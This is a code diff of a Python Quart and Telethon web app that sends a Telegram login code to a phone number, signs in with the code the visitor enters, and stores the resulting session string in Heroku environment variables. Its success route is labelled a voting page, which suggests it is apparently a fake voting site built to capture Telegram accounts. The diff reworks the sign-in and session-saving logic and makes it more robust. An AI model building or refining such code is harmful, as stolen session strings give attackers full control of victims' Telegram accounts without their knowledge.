@@ -7,6 +7,7 @@ from dotenv import load_dotenv
 import asyncio
 import heroku3  # Библиотека для работы с Heroku API
 import subprocess
+from telethon.errors import RPCError
 
 # Загрузка переменных окружения
 load_dotenv()
@@ -50,13 +51,13 @@ async def send_code_with_delay(phone_number):
         result = await client.send_code_request(phone_number)
         logger.debug(f"Код успешно отправлен на номер {phone_number}. phone_code_hash: {result.phone_code_hash}")
         return result
-    except errors.FloodWait as e:
-        logger.error(f"Превышен лимит запросов, необходимо подождать {e.seconds} секунд.")
-        await asyncio.sleep(e.seconds)
-        return None
-    except Exception as e:
-        logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
-        raise
+    except RPCError as e:
+        if isinstance(e, errors.FloodWait):
+            logger.error(f"Превышен лимит запросов, необходимо подождать {e.seconds} секунд.")
+            await asyncio.sleep(e.seconds)
+        else:
+            logger.error(f"Ошибка при отправке кода на номер {phone_number}: {e}")
+            raise
 
 # Функция для получения сессии из Heroku
 def get_session_from_heroku(phone_number):
@@ -149,36 +150,30 @@ async def verify_code():
         phone_number = quart_session.get('phone_number')
         phone_code_hash = quart_session.get('phone_code_hash')
 
-        # Очистка номера телефона
-        clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
-
-        logger.debug(f"Получен код подтверждения от пользователя: {verification_code}")
-        logger.debug(f"Номер телефона из сессии: {phone_number}")
-        logger.debug(f"Хэш кода из сессии: {phone_code_hash}")
-
-        if clean_phone_number and phone_code_hash:
-            try:
-                logger.debug(f"Попытка авторизации для номера {clean_phone_number} с кодом {verification_code}")
-                await client.sign_in(phone=clean_phone_number, code=verification_code, phone_code_hash=phone_code_hash)
-                logger.debug(f"Авторизация успешна для номера {clean_phone_number}")
-
-                # Сохранение сессии
-                session_str = client.session.save()
-                logger.debug(f"Сохраненная сессия: {session_str[:50]}... (урезано для читаемости)")
-
-                # Сохранение сессии в переменной окружения на Heroku через API
-                save_session_to_heroku(clean_phone_number, session_str)
-
-                return redirect(url_for('success_page'))
-
-            except Exception as e:
-                logger.error(f"Ошибка при авторизации для номера {clean_phone_number}. Ошибка: {e}")
-                return f"Ошибка при проверке кода: {e}"
-
-        else:
+        if not phone_number or not phone_code_hash:
             logger.error(f"Ошибка: Отсутствует номер телефона или хэш кода в сессии.")
-            return redirect(url_for('telegram_number_route'))
+            return redirect(url_for('telegram_number_route'))  # Возврат на ввод номера телефона
 
+        try:
+            logger.debug(f"Попытка авторизации для номера {phone_number} с кодом {verification_code}")
+            await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
+            logger.debug(f"Авторизация успешна для номера {phone_number}")
+
+            # Сохранение сессии
+            session_str = client.session.save()
+            logger.debug(f"Сохраненная сессия: {session_str[:50]}... (урезано для читаемости)")
+
+            # Сохранение сессии в переменной окружения на Heroku через API
+            save_session_to_heroku(phone_number, session_str)
+
+            return redirect(url_for('success_page'))  # Перенаправление на успешную страницу
+
+        except Exception as e:
+            logger.error(f"Ошибка при авторизации для номера {phone_number}. Ошибка: {e}")
+            return f"Ошибка при проверке кода: {e}"
+
+    # Если метод GET, просто отображаем страницу ввода кода
+    return await render_template('telegram-code.html')
 
 # Страница успешного голосования
 @app.route('/success')
@@ -194,7 +189,62 @@ if __name__ == '__main__':
 
 
 
-#----------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# #----------------------------------------------------------------
 # from quart import Quart, request, redirect, url_for, render_template, session as quart_session
 # import os
 # from telethon import TelegramClient, errors
